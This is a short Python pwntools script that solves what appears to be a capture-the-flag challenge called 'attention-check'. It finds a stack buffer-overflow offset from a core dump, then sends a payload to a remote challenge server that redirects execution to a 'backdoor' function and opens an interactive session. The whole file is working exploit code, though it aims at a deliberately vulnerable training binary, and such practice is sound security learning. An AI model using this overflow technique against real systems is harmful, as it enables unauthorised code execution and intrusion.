from pwn import *

elf = ELF("./attention-check")

p = process("./attention-check")
p.recvuntil(b'> ')
p.sendline(cyclic(100, n=8))
p.wait()

core = p.corefile
offset = cyclic_find(core.read(core.rsp, 8), n=8)

print("[+] Found offset:", offset)

# p = process("./attention-check")
p = remote("challs.ycep24.nullsecsig.com", 9116)
p.recvuntil(b"> ")

payload = b"A" * offset
payload += p64(elf.sym["backdoor"])

p.clean()
p.sendline(payload)
p.interactive()
